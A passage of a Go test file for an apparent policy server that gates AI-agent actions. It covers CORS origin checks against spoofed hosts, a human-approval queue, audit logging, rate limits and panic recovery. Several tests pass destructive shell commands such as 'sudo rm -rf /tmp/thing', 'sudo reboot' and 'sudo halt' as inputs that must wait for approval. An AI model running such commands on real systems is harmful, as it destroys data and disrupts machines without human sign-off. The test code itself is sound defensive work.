		{"http://localhost:3000", true},
		{"http://localhost:8080", true},
		{"http://127.0.0.1:9999", true},
		{"http://localhost", true},
		{"http://127.0.0.1", true},

		// External origins must still be rejected.
		{"https://evil.com", false},
		// Hostname-prefix attack: must NOT slip through.
		{"http://localhost.evil.com", false},
		{"http://127.0.0.1.evil.com", false},
		// No scheme/protocol-relative URL must not match.
		{"//localhost:3000", false},
	}

	for _, c := range cases {
		req := httptest.NewRequest(http.MethodGet, "/test", nil)
		req.Header.Set("Origin", c.origin)
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		got := w.Header().Get("Access-Control-Allow-Origin")
		if c.want {
			if got != c.origin {
				t.Errorf("origin %q should be allowed, got ACAO=%q", c.origin, got)
			}
		} else {
			if got != "" {
				t.Errorf("origin %q should be rejected, got ACAO=%q", c.origin, got)
			}
		}
	}
}

func TestCORS_ExactOriginMatch(t *testing.T) {
	handler := withCORS("https://myapp.com")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Origin", "https://myapp.com")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Header().Get("Access-Control-Allow-Origin") != "https://myapp.com" {
		t.Error("exact origin match should be allowed")
	}
	if w.Header().Get("Access-Control-Allow-Credentials") != "true" {
		t.Error("credentials mode must be enabled so session cookie is sent")
	}
	if !strings.Contains(w.Header().Get("Vary"), "Origin") {
		t.Error("Vary: Origin must be set to prevent cache poisoning")
	}
}

func TestCORS_OriginMismatch_Rejected(t *testing.T) {
	handler := withCORS("https://myapp.com")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	// Subtly different origin (trailing port) must NOT match.
	for _, origin := range []string{"https://myapp.com:8443", "http://myapp.com", "https://myapp.com.evil.com"} {
		req := httptest.NewRequest(http.MethodGet, "/test", nil)
		req.Header.Set("Origin", origin)
		w := httptest.NewRecorder()
		handler.ServeHTTP(w, req)

		if got := w.Header().Get("Access-Control-Allow-Origin"); got != "" {
			t.Errorf("origin %q must not match %q but got ACAO=%q", origin, "https://myapp.com", got)
		}
	}
}

func TestCORS_Preflight_StrictMode(t *testing.T) {
	handler := withCORS("https://app.example")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot) // should not reach here
	}))

	req := httptest.NewRequest(http.MethodOptions, "/v1/check", nil)
	req.Header.Set("Origin", "https://app.example")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("preflight should short-circuit with 204, got %d", w.Code)
	}
}

// Preflight also short-circuits in permissive-localhost mode so browsers
// don't see the downstream 405/teapot.
func TestCORS_Preflight_PermissiveLocalhost(t *testing.T) {
	handler := withCORS("")(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot)
	}))

	req := httptest.NewRequest(http.MethodOptions, "/v1/check", nil)
	req.Header.Set("Origin", "http://localhost:3000")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Errorf("preflight should short-circuit with 204, got %d", w.Code)
	}
	if w.Header().Get("Access-Control-Allow-Origin") != "http://localhost:3000" {
		t.Error("permissive-localhost mode must reflect the localhost origin on preflight")
	}
}

// --- ApprovalQueue ---

func TestApprovalQueue_AddAndList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa1 := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test1"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	pa2 := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test2"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if !strings.HasPrefix(pa1.ID, "ap_") {
		t.Errorf("ID should start with ap_, got %s", pa1.ID)
	}
	if pa1.ID == pa2.ID {
		t.Error("IDs should be unique")
	}

	list := q.List("local")
	if len(list) != 2 {
		t.Errorf("expected 2 pending, got %d", len(list))
	}
}

func TestApprovalQueue_ResolveRemovesFromList(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	pa := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	if err := q.Resolve(pa.ID, policy.Allow, "local"); err != nil {
		t.Fatalf("Resolve: %v", err)
	}

	// Resolved actions should not appear in List()
	list := q.List("local")
	if len(list) != 0 {
		t.Errorf("expected 0 pending after resolve, got %d", len(list))
	}
}

// TestApprovalQueue_SubscribeTracksGauge: Subscribe/Unsubscribe must keep
// the agentguard_sse_subscribers gauge in sync — this is the only way
// operators can see whether SSE clients are actually connected.
func TestApprovalQueue_SubscribeTracksGauge(t *testing.T) {
	q := &ApprovalQueue{
		pending: make(map[string]*PendingAction),
		maxSize: 10,
	}

	// Snapshot via Prometheus output; comparing deltas avoids leaking from
	// other tests that also touch SSE state.
	readGauge := func() int64 {
		var buf bytes.Buffer
		metrics.WritePrometheus(&buf)
		out := buf.String()
		// Anchor on "\n<metric> " — the substring "agentguard_sse_subscribers "
		// also appears in the HELP and TYPE lines, which begin with '#'.
		const prefix = "\nagentguard_sse_subscribers "
		idx := strings.Index(out, prefix)
		if idx == -1 {
			t.Fatalf("sse subscribers data line missing; out:\n%s", out)
		}
		line := out[idx+len(prefix):]
		nl := strings.Index(line, "\n")
		if nl == -1 {
			t.Fatal("no newline after gauge value")
		}
		n, err := strconv.ParseInt(strings.TrimSpace(line[:nl]), 10, 64)
		if err != nil {
			t.Fatalf("gauge value parse: %v", err)
		}
		return n
	}

	before := readGauge()
	a := q.Subscribe("local")
	b := q.Subscribe("local")
	if got := readGauge(); got != before+2 {
		t.Errorf("gauge after 2 subs = %d, want %d", got, before+2)
	}
	q.Unsubscribe(a)
	if got := readGauge(); got != before+1 {
		t.Errorf("gauge after 1 unsub = %d, want %d", got, before+1)
	}
	q.Unsubscribe(b)
	if got := readGauge(); got != before {
		t.Errorf("gauge after all unsubs = %d, want %d", got, before)
	}
}

// TestApprovalQueue_BroadcastDropsIncrementCounter: when a subscriber
// can't keep up, broadcastLocked drops the event into the default branch.
// That drop must be visible via
// agentguard_sse_events_dropped_total{reason="slow_consumer"}; silent
// drops are the exact pathology the metric exists to surface.
func TestApprovalQueue_BroadcastDropsIncrementCounter(t *testing.T) {
	q := &ApprovalQueue{
		pending: make(map[string]*PendingAction),
		maxSize: 10,
	}

	ch := q.Subscribe("local")
	defer q.Unsubscribe(ch)

	// Fill the buffer without draining. One more broadcast than
	// SSEChannelBufferSize guarantees at least one drop.
	for i := 0; i < SSEChannelBufferSize; i++ {
		q.Broadcast(AuditEvent{Type: "check"})
	}

	before := metrics.SSEEventDroppedFor(metrics.SSEDroppedSlowConsumer)
	q.Broadcast(AuditEvent{Type: "check"}) // must drop
	q.Broadcast(AuditEvent{Type: "check"}) // must drop
	after := metrics.SSEEventDroppedFor(metrics.SSEDroppedSlowConsumer)

	if got := after - before; got != 2 {
		t.Errorf("slow_consumer drops = %d, want 2", got)
	}
}

// TestApprovalQueue_EvictsOldestResolvedOnly: at capacity, Add evicts
// exactly one entry — the resolved entry with the earliest CreatedAt.
// Other resolved entries are left alone; they may still be useful for
// /v1/status polling until they too age out.
func TestApprovalQueue_EvictsOldestResolvedOnly(t *testing.T) {
	q := &ApprovalQueue{
		pending: make(map[string]*PendingAction),
		maxSize: 3,
	}

	// Add three entries spaced in CreatedAt order. The three Add() calls are
	// serialized by the queue mutex so their CreatedAt values are strictly
	// increasing, but nanosecond resolution on fast hosts could collide —
	// force distinct timestamps after the fact to keep the LRU tie-break
	// deterministic.
	older := mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo a"}, policy.CheckResult{Decision: policy.RequireApproval})
	middle := mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo b"}, policy.CheckResult{Decision: policy.RequireApproval})
	newest := mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo c"}, policy.CheckResult{Decision: policy.RequireApproval})
	q.mu.Lock()
	q.pending[older.ID].CreatedAt = time.Unix(1, 0)
	q.pending[middle.ID].CreatedAt = time.Unix(2, 0)
	q.pending[newest.ID].CreatedAt = time.Unix(3, 0)
	q.mu.Unlock()

	// Resolve both `older` and `middle`. The next Add must evict `older` —
	// not `middle`, even though both are resolved.
	if err := q.Resolve(older.ID, policy.Allow, "local"); err != nil {
		t.Fatal(err)
	}
	if err := q.Resolve(middle.ID, policy.Allow, "local"); err != nil {
		t.Fatal(err)
	}

	beforeEvicted := metrics.ApprovalEvictedFor(metrics.ApprovalEvictedLRUResolved)
	fresh := mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo d"}, policy.CheckResult{Decision: policy.RequireApproval})
	if got := metrics.ApprovalEvictedFor(metrics.ApprovalEvictedLRUResolved); got != beforeEvicted+1 {
		t.Errorf("lru_resolved counter did not advance by 1: before=%d after=%d", beforeEvicted, got)
	}

	q.mu.RLock()
	defer q.mu.RUnlock()

	if _, ok := q.pending[older.ID]; ok {
		t.Error("oldest resolved entry should have been evicted")
	}
	if _, ok := q.pending[middle.ID]; !ok {
		t.Error("newer resolved entry must NOT be evicted — LRU drops only the oldest")
	}
	if _, ok := q.pending[newest.ID]; !ok {
		t.Error("unresolved entry must survive eviction")
	}
	if _, ok := q.pending[fresh.ID]; !ok {
		t.Error("newly-added entry must be present after the Add that triggered eviction")
	}
	if got := len(q.pending); got != 3 {
		t.Errorf("queue size after eviction+add = %d, want 3 (at cap)", got)
	}
}

// TestApprovalQueue_FullRejectsWhenAllUnresolved: when every slot is still
// unresolved, Add must refuse with ErrApprovalQueueFull so the HTTP layer
// can respond 503 + Retry-After instead of generating an approval ID the
// agent will poll in vain.
func TestApprovalQueue_FullRejectsWhenAllUnresolved(t *testing.T) {
	q := &ApprovalQueue{
		pending: make(map[string]*PendingAction),
		maxSize: 2,
	}
	mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo a"}, policy.CheckResult{Decision: policy.RequireApproval})
	mustAdd(t, q, policy.ActionRequest{Scope: "shell", Command: "sudo b"}, policy.CheckResult{Decision: policy.RequireApproval})

	beforeRejected := metrics.ApprovalEvictedFor(metrics.ApprovalEvictedQueueFull)
	_, err := q.Add(
		policy.ActionRequest{Scope: "shell", Command: "sudo c"},
		policy.CheckResult{Decision: policy.RequireApproval},
		"local",
	)
	if err == nil {
		t.Fatal("Add at full capacity with no resolved entries must return an error")
	}
	if !errors.Is(err, ErrApprovalQueueFull) {
		t.Errorf("error should be ErrApprovalQueueFull, got %v", err)
	}
	if got := metrics.ApprovalEvictedFor(metrics.ApprovalEvictedQueueFull); got != beforeRejected+1 {
		t.Errorf("queue_full counter did not advance by 1: before=%d after=%d", beforeRejected, got)
	}

	// Nothing was added, nothing was evicted — invariants must hold.
	q.mu.RLock()
	defer q.mu.RUnlock()
	if got := len(q.pending); got != 2 {
		t.Errorf("queue size after rejected Add = %d, want 2", got)
	}
}

// TestHandleCheck_503OnApprovalQueueFull: when the policy says
// REQUIRE_APPROVAL but the queue is full of unresolved entries, the HTTP
// handler must respond 503 with a numeric Retry-After header — not 500.
func TestHandleCheck_503OnApprovalQueueFull(t *testing.T) {
	s := newTestServer(t)

	// Shrink the queue to 1 and pre-fill it with an unresolved entry so the
	// next /v1/check that would require approval is guaranteed to hit the
	// capacity branch.
	s.approval.maxSize = 1
	mustAdd(t, s.approval,
		policy.ActionRequest{Scope: "shell", Command: "sudo prefill"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)

	body, err := json.Marshal(policy.ActionRequest{
		AgentID: "bot",
		Scope:   "shell",
		Command: "sudo rm -rf /tmp/thing", // matches the REQUIRE_APPROVAL rule in newTestServer
	})
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodPost, "/v1/check", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rw := httptest.NewRecorder()

	s.handleCheck(rw, req)

	if rw.Code != http.StatusServiceUnavailable {
		t.Errorf("status = %d, want 503", rw.Code)
	}
	ra := rw.Header().Get("Retry-After")
	if ra == "" {
		t.Error("Retry-After header must be set on 503")
	}
	if ra != fmt.Sprint(ApprovalQueueFullRetryAfterSeconds) {
		t.Errorf("Retry-After = %q, want %q", ra, fmt.Sprint(ApprovalQueueFullRetryAfterSeconds))
	}
}

func TestApprovalQueue_ResolveNotFound(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	err := q.Resolve("ap_nonexistent", policy.Allow, "local")
	if err == nil {
		t.Error("expected error for non-existent ID")
	}
}

func TestApprovalQueue_SSEBroadcast(t *testing.T) {
	q := &ApprovalQueue{pending: make(map[string]*PendingAction)}

	ch := q.Subscribe("local")
	defer q.Unsubscribe(ch)

	// Add should trigger a broadcast via Resolve
	pa := mustAdd(t, q,
		policy.ActionRequest{Scope: "shell", Command: "sudo test"},
		policy.CheckResult{Decision: policy.RequireApproval},
	)
	_ = q.Resolve(pa.ID, policy.Allow, "local")

	select {
	case event := <-ch:
		if event.Type != "resolved" {
			t.Errorf("expected resolved event, got %s", event.Type)
		}
	case <-time.After(time.Second):
		t.Error("expected SSE event within 1 second")
	}
}

// --- Full round-trip: check → approve → status ---

func TestFullApprovalRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo reboot","agent_id":"agent-1"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	if checkResult.Decision != policy.RequireApproval {
		t.Fatalf("step 1: expected REQUIRE_APPROVAL, got %s", checkResult.Decision)
	}

	approvalID := checkResult.ApprovalID

	// Step 2: Poll status — should be pending
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var statusResp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&statusResp)
	if statusResp["status"] != "pending" {
		t.Fatalf("step 2: expected pending, got %s", statusResp["status"])
	}

	// Step 3: Approve
	approveReq := httptest.NewRequest(http.MethodPost, "/v1/approve/"+approvalID, nil)
	approveReq.Header.Set("Authorization", "Bearer test-secret")
	approveW := httptest.NewRecorder()
	srv.handleApprove(approveW, approveReq)

	if approveW.Code != http.StatusOK {
		t.Fatalf("step 3: expected 200, got %d", approveW.Code)
	}

	// Step 4: Poll status — should be resolved
	statusReq2 := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW2 := httptest.NewRecorder()
	srv.handleStatus(statusW2, statusReq2)

	statusResp2 := map[string]string{}
	_ = json.NewDecoder(statusW2.Body).Decode(&statusResp2)
	if statusResp2["status"] != "resolved" {
		t.Fatalf("step 4: expected resolved, got %s", statusResp2["status"])
	}
	if statusResp2["decision"] != "ALLOW" {
		t.Fatalf("step 4: expected ALLOW, got %s", statusResp2["decision"])
	}

	// Step 5: Verify audit log has the entry
	auditReq := httptest.NewRequest(http.MethodGet, "/v1/audit?agent_id=agent-1", nil)
	auditW := httptest.NewRecorder()
	srv.handleAuditQuery(auditW, auditReq)

	var auditEntries []audit.Entry
	_ = json.NewDecoder(auditW.Body).Decode(&auditEntries)
	if len(auditEntries) < 1 {
		t.Error("step 5: expected at least 1 audit entry for agent-1")
	}
}

// --- Full round-trip: check → deny → status ---

func TestFullDenyRoundTrip(t *testing.T) {
	srv := newTestServer(t)

	// Step 1: Check returns REQUIRE_APPROVAL
	checkBody := `{"scope":"shell","command":"sudo halt","agent_id":"agent-2"}`
	checkReq := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(checkBody))
	checkW := httptest.NewRecorder()
	srv.handleCheck(checkW, checkReq)

	var checkResult policy.CheckResult
	_ = json.NewDecoder(checkW.Body).Decode(&checkResult)
	approvalID := checkResult.ApprovalID

	// Step 2: Deny
	denyReq := httptest.NewRequest(http.MethodPost, "/v1/deny/"+approvalID, nil)
	denyReq.Header.Set("Authorization", "Bearer test-secret")
	denyW := httptest.NewRecorder()
	srv.handleDeny(denyW, denyReq)

	if denyW.Code != http.StatusOK {
		t.Fatalf("deny: expected 200, got %d", denyW.Code)
	}

	// Step 3: Status should be denied
	statusReq := httptest.NewRequest(http.MethodGet, "/v1/status/"+approvalID, nil)
	statusW := httptest.NewRecorder()
	srv.handleStatus(statusW, statusReq)

	var resp map[string]string
	_ = json.NewDecoder(statusW.Body).Decode(&resp)
	if resp["decision"] != "DENY" {
		t.Errorf("expected DENY, got %s", resp["decision"])
	}
}

// --- Verify localhost binding when no API key ---

func TestNewServer_LocalhostBindingWithoutAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngineFromPolicy(pol),
		Logger:  logger,
		APIKey:  "", // No API key
		Version: "test",
	})

	if !strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("without API key, should bind to 127.0.0.1, got %s", srv.http.Addr)
	}
}

func TestSessionCostSweeper_Lifecycle(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{
		Version: "1",
		Name:    "sweep-test",
		Rules: []policy.RuleSet{
			{Scope: "cost", Limits: &policy.CostLimits{MaxPerAction: "$5.00", MaxPerSession: "$100.00"}},
		},
	}

	// TTL=0 (default) must NOT start a sweeper goroutine.
	srvNoTTL := NewServer(Config{
		Port:    0,
		Engine:  policy.NewEngineFromPolicy(pol),
		Logger:  logger,
		Version: "test",
	})
	if srvNoTTL.sweeperDone != nil {
		t.Error("sweeperDone should be nil when SessionCostTTL=0 (sweep disabled)")
	}

	// TTL>0 starts the sweeper and Shutdown cleans it up.
	engine := policy.NewEngineFromPolicy(pol)
	srv := NewServer(Config{
		Port:                     0,
		Engine:                   engine,
		Logger:                   logger,
		Version:                  "test",
		SessionCostTTL:           10 * time.Millisecond,
		SessionCostSweepInterval: 5 * time.Millisecond,
	})
	if srv.sweeperDone == nil {
		t.Fatal("sweeperDone should be set when SessionCostTTL>0")
	}

	// Seed a stale entry and wait for at least two sweep ticks.
	engine.RecordCost("s", 1.00)
	// Backdate lastUpdated via a second RecordCost that advances time -- but we
	// can't reach the unexported field from here. Instead, rely on the ticker:
	// after a couple of intervals the fresh entry stays (it's not older than
	// TTL), but we just validate the goroutine runs and Shutdown unblocks it.
	time.Sleep(20 * time.Millisecond)

	// Shutdown must close sweeperDone without panicking.
	srv.Shutdown()

	// The sweeper channel must now be closed — a receive returns immediately.
	select {
	case <-srv.sweeperDone:
		// ok, channel closed as expected
	case <-time.After(time.Second):
		t.Error("sweeperDone was not closed by Shutdown")
	}

	// Calling Shutdown twice must not panic (idempotence via sync.Once).
	srv.Shutdown()
}

func TestNewServer_AllInterfaceBindingWithAPIKey(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, _ := audit.NewFileLogger(logPath)
	defer logger.Close()

	pol := &policy.Policy{Version: "1", Name: "test", Rules: []policy.RuleSet{}}

	srv := NewServer(Config{
		Port:    8080,
		Engine:  policy.NewEngineFromPolicy(pol),
		Logger:  logger,
		APIKey:  "my-secret",
		Version: "test",
	})

	if strings.Contains(srv.http.Addr, "127.0.0.1") {
		t.Errorf("with API key, should bind to all interfaces, got %s", srv.http.Addr)
	}
}

// --- Verify XSS mitigation in dashboard ---

func TestDashboard_NoUnsafeInnerHTML(t *testing.T) {
	// Ensure the dashboard HTML doesn't use innerHTML for user-controlled data.
	// Safe patterns: textContent, createElement, esc() helper.
	// Unsafe pattern: .innerHTML = ` (template literal with interpolation)
	if strings.Contains(dashboardHTML, ".innerHTML = `") {
		t.Error("dashboard contains .innerHTML with template literal — XSS risk")
	}

	// Check that the esc() helper exists
	if !strings.Contains(dashboardHTML, "function esc(") {
		t.Error("dashboard should contain esc() HTML escaping helper")
	}

	// Check that textContent is used
	if !strings.Contains(dashboardHTML, "textContent") {
		t.Error("dashboard should use textContent for safe text insertion")
	}
}

// --- Edge case: empty body ---

func TestHandleCheck_EmptyBody(t *testing.T) {
	srv := newTestServer(t)

	req := httptest.NewRequest(http.MethodPost, "/v1/check", bytes.NewReader(nil))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400 for empty body, got %d", w.Code)
	}
}

// --- Startup checkpoint ---

// TestNewServer_WritesStartupCheckpoint: after NewServer boots on a file
// with existing audit entries, a checkpoint must exist so a future boot
// can resume instead of rescanning.
func TestNewServer_WritesStartupCheckpoint(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")

	// Pre-populate an audit file.
	seed, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 3; i++ {
		if err := seed.Log(audit.Entry{
			Timestamp: time.Now().UTC(),
			AgentID:   "seed",
			Result:    policy.CheckResult{Decision: policy.Allow},
		}); err != nil {
			t.Fatal(err)
		}
	}
	seed.Close()

	// Boot a server against the same file.
	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { logger.Close() })

	cfg := Config{
		Engine:   policy.NewEngineFromPolicy(&policy.Policy{Version: "1", Name: "x"}),
		Logger:   logger,
		Notifier: notify.NewDispatcher(policy.NotificationCfg{}),
		Version:  "test",
	}
	_ = NewServer(cfg)

	cp, err := audit.ReadCheckpoint(logPath)
	if err != nil {
		t.Fatalf("ReadCheckpoint: %v", err)
	}
	if cp == nil {
		t.Fatal("NewServer must write a checkpoint after seeding counters")
	}
	if cp.Offset <= 0 {
		t.Errorf("expected positive checkpoint offset, got %d", cp.Offset)
	}
}

// TestNewServer_ResumesFromCheckpoint: a pre-existing checkpoint covering
// the full file must prevent NewServer's seed loop from double-counting
// when new entries arrive only after the checkpoint was written.
func TestNewServer_ResumesFromCheckpoint(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")

	// Write a handful of entries.
	seed, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 5; i++ {
		if err := seed.Log(audit.Entry{
			Timestamp: time.Now().UTC(),
			AgentID:   "pre",
			Result:    policy.CheckResult{Decision: policy.Allow},
		}); err != nil {
			t.Fatal(err)
		}
	}
	seed.Close()

	// Pretend a previous boot already processed everything.
	info, err := fileSize(logPath)
	if err != nil {
		t.Fatal(err)
	}
	if err := audit.WriteCheckpoint(logPath, audit.Checkpoint{Offset: info, AuditSize: info}); err != nil {
		t.Fatal(err)
	}

	// Snapshot the allowed counter before boot — the seeder must not bump it.
	before := atomic.LoadUint64(&metrics.AllowedTotal)

	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { logger.Close() })

	_ = NewServer(Config{
		Engine:   policy.NewEngineFromPolicy(&policy.Policy{Version: "1", Name: "x"}),
		Logger:   logger,
		Notifier: notify.NewDispatcher(policy.NotificationCfg{}),
		Version:  "test",
	})

	after := atomic.LoadUint64(&metrics.AllowedTotal)
	if after != before {
		t.Errorf("checkpointed file must be skipped on boot; AllowedTotal went from %d to %d", before, after)
	}
}

func fileSize(path string) (int64, error) {
	info, err := os.Stat(path)
	if err != nil {
		return 0, err
	}
	return info.Size(), nil
}

// TestRecoverMiddleware closes R3 #J. A handler panic must be caught so the
// server returns 500 rather than tearing down the listener. The synthetic
// handler is mounted via the same recoverPanic + withCORS + withLogging
// chain that real handlers use.
func TestRecoverMiddleware(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/boom", func(w http.ResponseWriter, r *http.Request) {
		panic("synthetic")
	})
	mux.HandleFunc("/ok", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
	h := recoverPanic(withCORS("")(withLogging(mux)))

	ts := httptest.NewServer(h)
	defer ts.Close()

	// First request panics — must come back 500 (recover middleware did its job).
	resp, err := http.Get(ts.URL + "/boom")
	if err != nil {
		t.Fatalf("GET /boom: %v", err)
	}
	if resp.StatusCode != http.StatusInternalServerError {
		t.Errorf("expected 500 for panicking handler, got %d", resp.StatusCode)
	}
	resp.Body.Close()

	// Second request must still be served — listener survived the panic.
	resp, err = http.Get(ts.URL + "/ok")
	if err != nil {
		t.Fatalf("GET /ok after panic: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Errorf("expected 200 from healthy handler after a prior panic, got %d", resp.StatusCode)
	}
	resp.Body.Close()
}

// TestRateLimitDoubleCount closes R3 #21. A rate-limited request must
// increment ChecksTotal and DeniedTotal exactly once each (not twice as
// in v0.4.x where IncRateLimited and IncDecision both bumped them).
//
// We construct a proxy server with a 1-rps rate limit, fire two requests in
// rapid succession (the second is rate-limited), and assert the metric
// deltas are: checks +2, denied +1, rate_limited +1.
func TestRateLimitDoubleCount(t *testing.T) {
	dir := t.TempDir()
	logPath := filepath.Join(dir, "audit.jsonl")
	logger, err := audit.NewFileLogger(logPath)
	if err != nil {
		t.Fatalf("NewFileLogger: %v", err)
	}
	t.Cleanup(func() { logger.Close() })

	// Policy: shell scope with rate limit of 1/min so a burst of 2 trips it
	// reliably without sleeping in the test.
	pol := &policy.Policy{
		Version: "1",
		Name:    "ratelimit-test",
		Rules: []policy.RuleSet{
			{
				Scope:     "shell",
				Allow:     []policy.Rule{{Pattern: "echo *"}},
				RateLimit: &policy.RateLimitCfg{MaxRequests: 1, Window: "1m"},
			},
		},
	}

	srv := NewServer(Config{
		Port:     0,
		Engine:   policy.NewEngineFromPolicy(pol),
		Logger:   logger,
		Notifier: notify.NewDispatcher(policy.NotificationCfg{}),
		APIKey:   "test-key",
		BaseURL:  "http://localhost:0",
		Version:  "test",
	})

	checksBefore := atomic.LoadUint64(&metrics.ChecksTotal)
	deniedBefore := atomic.LoadUint64(&metrics.DeniedTotal)
	rlBefore := atomic.LoadUint64(&metrics.RateLimitedTotal)

	// First request: under the limit, expect ALLOW (or default-deny — but
	// this command matches the allow rule, so ALLOW).
	body := `{"scope":"shell","command":"echo hi","agent_id":"a1"}`
	for i := 0; i < 2; i++ {
		req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		srv.handleCheck(w, req)
	}

	checksAfter := atomic.LoadUint64(&metrics.ChecksTotal)
	deniedAfter := atomic.LoadUint64(&metrics.DeniedTotal)
	rlAfter := atomic.LoadUint64(&metrics.RateLimitedTotal)

	// 2 total checks (one allowed, one rate-limited DENY).
	if got := checksAfter - checksBefore; got != 2 {
		t.Errorf("ChecksTotal delta: got %d, want 2 (one ALLOW + one rate-limit DENY)", got)
	}
	// 1 denied (only the rate-limited one).
	if got := deniedAfter - deniedBefore; got != 1 {
		t.Errorf("DeniedTotal delta: got %d, want 1 (rate-limit DENY counted exactly once, not twice)", got)
	}
	// 1 rate-limit specifically.
	if got := rlAfter - rlBefore; got != 1 {
		t.Errorf("RateLimitedTotal delta: got %d, want 1", got)
	}
}

// --- Transport tag ---
//
// The MCP Gateway and the LLM API Proxy stamp meta["transport"] on
// every /v1/check call. The server defaults unset transport to "sdk"
// so SDK callers don't need to change. The audit entry, the SSE event
// broadcast, and /v1/audit's transport= filter all read from the same
// source.

// readLatestAuditEntry returns the last decoded entry from the
// FileLogger backing the test server. Useful for asserting on what
// the server actually persisted, not just what the SDK saw on the
// HTTP response.
func readLatestAuditEntry(t *testing.T, srv *Server) audit.Entry {
	t.Helper()
	entries, err := srv.cfg.Logger.Query(audit.QueryFilter{})
	if err != nil {
		t.Fatalf("Query: %v", err)
	}
	if len(entries) == 0 {
		t.Fatalf("expected at least one audit entry")
	}
	return entries[len(entries)-1]
}

func TestHandleCheck_DefaultsTransportToSDK(t *testing.T) {
	srv := newTestServer(t)

	// SDK callers don't currently emit meta["transport"]; they
	// implicitly identify as "sdk".
	body := `{"scope":"shell","command":"ls -la","agent_id":"sdk-bot"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	entry := readLatestAuditEntry(t, srv)
	if entry.Transport != audit.TransportSDK {
		t.Errorf("Entry.Transport = %q; want %q (default)", entry.Transport, audit.TransportSDK)
	}
}

func TestHandleCheck_HonorsTransportFromMeta(t *testing.T) {
	srv := newTestServer(t)

	// Body shape mirrors what pkg/mcpgw/gate.go's HTTPPolicyClient
	// stamps on every dual-check call.
	body := `{
		"scope": "shell",
		"command": "ls -la",
		"agent_id": "mcp-gateway:claude-desktop",
		"meta": {"transport": "mcp_gateway"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/v1/check", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.handleCheck(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	entry := readLatestAuditEntry(t, srv)
